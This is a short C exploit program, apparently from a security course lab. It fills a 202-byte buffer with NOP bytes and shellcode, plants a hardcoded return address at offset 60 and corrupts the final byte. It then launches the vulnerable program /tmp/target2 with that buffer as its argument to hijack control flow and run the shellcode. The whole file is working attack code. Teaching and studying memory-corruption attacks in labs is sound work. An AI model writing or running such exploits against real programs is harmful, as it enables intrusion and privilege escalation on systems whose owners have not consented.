#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char sploit[202];
  memset(sploit, '\x90', sizeof(sploit));
  sploit[sizeof(sploit)-2] = '\x00';
  sploit[sizeof(sploit)-1] = '\0';
  memcpy(sploit, shellcode, sizeof(shellcode)-1);
  *(int*)(sploit+60) = 0xbffffcc8;
  
  char *args[] = { TARGET, sploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
